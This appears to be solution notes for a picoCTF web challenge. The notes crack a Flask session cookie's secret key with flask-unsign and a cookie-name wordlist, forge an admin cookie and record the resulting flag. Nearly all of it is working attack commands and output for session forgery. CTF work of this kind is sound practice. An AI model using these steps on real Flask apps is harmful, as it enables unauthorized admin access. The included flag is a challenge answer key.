#pip3 install flask-unsign

'''
wordlist from server.py

"snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"

'''


#'snickerdoodle' -> 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YMqv0A.7Ft5REupscYmRvpTXSz0eURZDi4'

#flask-unsign --unsign --cookie < cookie.txt --wordlist wordlsit.txt
#The key is butter

#flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret butter
#eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YMqu0A.ZZ4YEAkvArJT_GR7dlnscQaGZqc
#picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}
